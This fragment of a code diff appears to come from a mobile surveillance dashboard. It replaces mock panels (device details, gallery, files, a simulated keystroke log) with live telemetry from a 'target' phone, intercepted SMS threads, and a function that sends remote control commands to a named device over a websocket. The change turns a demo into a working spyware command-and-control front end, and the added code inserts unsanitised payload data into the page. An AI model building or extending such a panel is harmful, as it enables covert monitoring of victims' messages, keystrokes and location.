+    const feedItem = `<div class="feed-item"><div class="fi">📱</div>
+      <div><b>${payload.model}</b> <span>— Live sync received (Battery: ${payload.battery}%, Net: ${payload.carrier})</span></div><time>Just now</time></div>`;
+    $('#liveFeed').insertAdjacentHTML('afterbegin', feedItem);
+
+    toast("Live telemetry updated from target!");
+  }
+};
+
+function selectSmsThread(sender, msg) {
   $('#chatHead').innerHTML = `
-    <div class="c-ava ${activeConvo.cls}">${activeConvo.initials}</div>
-    <div><div style="font-size:13.5px;font-weight:600">${activeConvo.name}</div>
-    <div style="font-size:11px;color:var(--dim)">SMS · encrypted relay</div></div>`;
-
-  $('#chatBody').innerHTML = activeConvo.thread.map(m=>`
-    <div class="bubble ${m.from}">${m.text}<time>${m.time}</time></div>`).join('');
-  $('#chatBody').scrollTop = $('#chatBody').scrollHeight;
+    <div class="c-ava">SMS</div>
+    <div><div style="font-size:13.5px;font-weight:600">${sender}</div>
+    <div style="font-size:11px;color:var(--dim)">Live SMS Thread</div></div>`;
+  $('#chatBody').innerHTML = `<div class="bubble them">${msg}<time>Live</time></div>`;
 }
 
-function sendMsg(){
-  const val = $('#msgInput').value.trim();
-  if(!val) return;
-  const now = new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
-  activeConvo.thread.push({ from:'me', text:val, time:now });
-  $('#msgInput').value = '';
-  renderThread(); renderConvos();
-  toast('SMS queued for delivery');
+function sendControl(action) {
+  ws.send(JSON.stringify({ device_id: "pixel_7_pro", action: action }));
+  toast(`Command [${action}] sent to target`);
 }
-$('#msgInput').addEventListener('keydown', e=>{ if(e.key==='Enter') sendMsg(); });
-
-/* ================== DEVICE DETAIL ================== */
-function renderDeviceDetail(){
-  const d = activeDevice;
-  $('#devStatusPill').textContent = d.status.toUpperCase();
-  $('#devStatusPill').className = 'pill ' + (d.status==='online'?'g':'r');
-  $('#ringPct').textContent = d.battery + '%';
-  $('.ring').style.background =
-    `conic-gradient(${d.battery>60?'var(--green)':d.battery>25?'var(--amber)':'var(--red)'} 0 ${d.battery}%, #182030 ${d.battery}% 100%)`;
-
-  const rows = [
-    ['Device Name', d.name], ['Model', d.model], ['OS Version', d.os],
-    ['IP Address', d.ip], ['Carrier / Network', d.carrier],
-    ['GPS Coordinates', d.gps], ['Location', d.city],
-    ['Root Status', d.root ? '<span class="pill r">ROOTED</span>'
-                           : '<span class="pill g">SECURE</span>'],
-    ['Battery', d.battery + '%' + (d.charging?' ⚡ Charging':'')],
-    ['RAM', d.ram], ['Storage', d.storage],
-    ['IMEI', d.imei], ['Android ID', d.androidId], ['Uptime', d.uptime]
-  ];
-  $('#infoList').innerHTML = rows.map(([k,v])=>
-    `<div class="info-row"><span>${k}</span><b>${v}</b></div>`).join('');
-}
-
-/* ================== GALLERY ================== */
-function renderMedia(tab='photos'){
-  $('#mediaGrid').innerHTML = media[tab].map(m=>`
-    <div class="media" style="background:${m.g}" onclick="toast('Opening ${m.label}')">
-      ${tab==='videos'?`<div class="play">▶</div><span class="dur">${m.dur}</span>`:''}
-      <span class="lbl">${m.label}</span>
-    </div>`).join('');
-}
-$$('.tab[data-tab]').forEach(t=>{
-  t.addEventListener('click',()=>{
-    $$('.tab[data-tab]').forEach(x=>x.classList.remove('active'));
-    t.classList.add('active');
-    renderMedia(t.dataset.tab);
-  });
-});
-
-/* ================== FILES ================== */
-function renderFiles(){
-  $('#fileList').innerHTML = files.map(f=>`
-    <div class="file-row" onclick="toast('Opening ${f.name}')">
-      <div class="f-ico">${f.type}</div>
-      <div class="f-name">${f.name}</div>
-      <div class="f-dim">${f.size}</div>
-      <div class="f-dim">${f.date}</div>
-      <div class="f-more">⋮</div>
-    </div>`).join('');
-}
-
-/* ================== CONTROLS ================== */
-$$('.ctrl[data-toggle]').forEach(c=>{
-  c.addEventListener('click',()=>{
-    c.classList.toggle('on');
-    const on = c.classList.contains('on');
-    const name = c.querySelector('h4').textContent;
-    toast(`${name} ${on?'ENABLED':'DISABLED'} on ${activeDevice.name}`);
-  });
-});
-
-/* ================== KEYSTROKES (MOCK ONLY) ================== */
-const keyPool = [
-  {app:'WhatsApp',  ico:'💬', win:'Arun Kumar — chat',    text:'bro call me when free da'},
-  {app:'Chrome',    ico:'🌐', win:'Google Search',        text:'tryhackme sqli room writeup'},
-  {app:'Instagram', ico:'📸', win:'Explore',              text:'cybersecurity memes tamil'},
-  {app:'Chrome',    ico:'🌐', win:'PortSwigger Labs',     text:'xss reflected lab solution'},
-  {app:'WhatsApp',  ico:'💬', win:'Divya R — chat',       text:'assignment submit pannitiya'},
-  {app:'Telegram',  ico:'✈️', win:'HTB Group',            text:'htb machine walkthrough link'},
-  {app:'Chrome',    ico:'🌐', win:'Google Search',        text:'linux privilege escalation cheat sheet'},
-  {app:'Instagram', ico:'📸', win:'Search',               text:'pentest tools 2026'},
-  {app:'Chrome',    ico:'🌐', win:'Terminal Docs',        text:'nmap -sV -sC scan syntax'},
-  {app:'WhatsApp', ico:'💬', win:'Karthik S — chat',      text:'naalaiku lab la meet pannalama'},
-  {app:'Telegram', ico:'✈️', win:'Study Group',           text:'notes share panren bro'},
-  {app:'Chrome',   ico:'🌐', win:'Notes',                 text:'OSCP exam date confirm pannu'}
-];
-
-let keylog = keyPool.map((k,i)=>({
-  ...k,
-  t: new Date(Date.now() - i*97000).toLocaleTimeString('en-GB')
-}));
-let keyFilter = 'all';
-
-function renderKeylog(){
-  const list = keyFilter === 'all'
-    ? keylog
-    : keylog.filter(k => k.app === keyFilter);
-
-  $('#keylogList').innerHTML = list.length ? list.map((k,idx)=>`
-    <div class="krow">
-      <div class="k-app">${k.ico}</div>
-      <div class="k-body">
-        <div class="k-win">${k.app} · ${k.win}</div>
-        <div class="k-text">${k.text}${idx===0?'<span class="caret"></span>':''}</div>
-      </div>
-      <div class="k-time">${k.t}</div>
-    </div>`).join('')
-    : `<div style="padding:26px;color:var(--dim);font-size:13px">No entries for this filter.</div>`;
-
-  $('#keylogCount').innerHTML = `${list.length}<span>events</span>`;
-}
-
-function clearKeylog(){
-  keylog = [];
-  renderKeylog();
-  toast('Keystroke buffer cleared');
-}
-
-$$('.tab[data-kf]').forEach(t=>{
-  t.addEventListener('click',()=>{
-    $$('.tab[data-kf]').forEach(x=>x.classList.remove('active'));
-    t.classList.add('active');
-    keyFilter = t.dataset.kf;
-    renderKeylog();
-  });
-});
-
-/* Fake ticker — pool la irundhu mattum, real capture illa */
-setInterval(()=>{
-  const v = document.getElementById('v-keylog');
-  if(!v || !v.classList.contains('active')) return;
-  const p = keyPool[Math.floor(Math.random()*keyPool.length)];
-  keylog.unshift({ ...p, t:new Date().toLocaleTimeString('en-GB') });
-  if(keylog.length > 40) keylog.pop();
-  renderKeylog();
-}, 4200);
-
-/* ================== INIT ================== */
-renderDevices();
-renderDeviceDetail();
-renderContacts();
-renderConvos();
-renderThread();
-renderMedia('photos');
-renderFiles();
-renderKeylog();
 </script>
 </body>
 </html>
